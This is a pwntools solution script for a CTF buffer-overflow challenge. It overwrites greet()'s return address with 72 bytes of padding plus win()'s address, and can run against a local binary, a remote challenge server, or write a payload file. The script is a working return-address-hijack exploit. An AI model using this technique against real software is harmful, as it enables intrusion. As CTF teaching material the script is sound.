#!usr/bin/env python3

"""
My App - Buffer Overflow Exploit
S&G Tech CTF Challenge Solution

This exploit overwrite the return address of the greet() function to redirect execution to the win() function, which prints the flag.
"""

from pwn import *

# ============================================================
# Configuration
# ============================================================

# Set context for the target binary
context.binary = './vuln'
context.log_level = 'info'

# Binary and ELF analysis
elf = ELF('./vuln')

# Remote connection settings (update these for the actual challenge)
REMOTE_HOST = 'challenge.sgtech.ctf.com'
REMOTE_PORT = 1337

# ============================================================
# Exploit Parameters
# ============================================================

# Buffer size in greet() function
BUFFER_SIZE = 64

# Offset to return address (buffer + saved RBP)
# 64 bytes buffer + 8 bytes saved RBP = 72 bytes
OFFSET = 72

# Address of win() function (no PIE, so address is static)
WIN_ADDR = elf.symbols['win']

# ============================================================
# Exploit Functions
# ============================================================

def create_payload():
    """
    Create the exploit payload.
    
    Stack layout before overflow
    +----------------+
    | return address |
    +----------------+
    | saved RBP      |
    +----------------+
    | name[64]       |
    +----------------+
    
    Payload structure:
    [padding (72 bytes)] + [win() address (8 bytes)]
    """
    payload = b'A' * OFFSET     # Fill buffer + saved RBP
    payload += p64(WIN_ADDR)    # Overwrite return address with win()
    return payload

def exploit_local():
    """Run the exploit against the local binary"""
    log.info("Starting local exploit...")
    
    # Start the process
    p = process('./vuln')
    
    # Create and send payload
    payload = create_payload()
    log.info(f"Payload length: {len(payload)} bytes")
    log.info(f"win() address: {hex(WIN_ADDR)}")
    
    # Wait for prompt and send payload
    p.recvuntil(b'Enter your name: ')
    p.sendline(payload)
    
    # Receive the flag
    p.recvline()    # "Hello, AAAA...!"
    response = p.recvall(timeout=2)
    
    print("\n" + "=" * 50)
    print(response.decode(errors='ignore'))
    print("=" * 50)
    
    p.close()
    
def exploit_remote():
    """Run the exploit against the remote server."""
    log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}...")
    
    # Connect to remote
    p = remote(REMOTE_HOST, REMOTE_PORT)
    
    # Create and send payload
    payload = create_payload()
    log.info(f"Payload length: {len(payload)} bytes")
    log.info(f"win() address: {hex(WIN_ADDR)}")
    
    # Wait for prompt and send payload
    p.recvuntil(b'Enter your name: ')
    p.sendline(payload)
    
    # Receive the flag
    p.interactive()
    
def generate_payload_file():
    """Generate a raw payload file for manual testing."""
    payload = create_payload()
    
    with open('solve/payload.bin', 'wb') as f:
        f.write(payload)
    
    log.success("Payload written to solve/payload.bin")
    log.info(f"Usage: cat solve/payload.bin | ./vuln")
    
# ============================================================
# Main
# ============================================================

if __name__ == '__main__':
    import sys
    print("My App - Buffer Overflow Exploit")
    print("S&G Tech CTF Challenge")
    
    print(f"[*] Target binary: {context.binary.path}")
    print(f"[*] win() function at: {hex(WIN_ADDR)}")
    print(f"[*] Offset to return address: {OFFSET} bytes")
    print()
    
    if len(sys.argv) > 1:
        if sys.argv[1] == 'remote':
            exploit_remote()
        elif sys.argv[1] == 'payload':
            generate_payload_file()
        else:
            print("Usage: python3 solve.py [local|remote|payload]")
    else:
        exploit_local()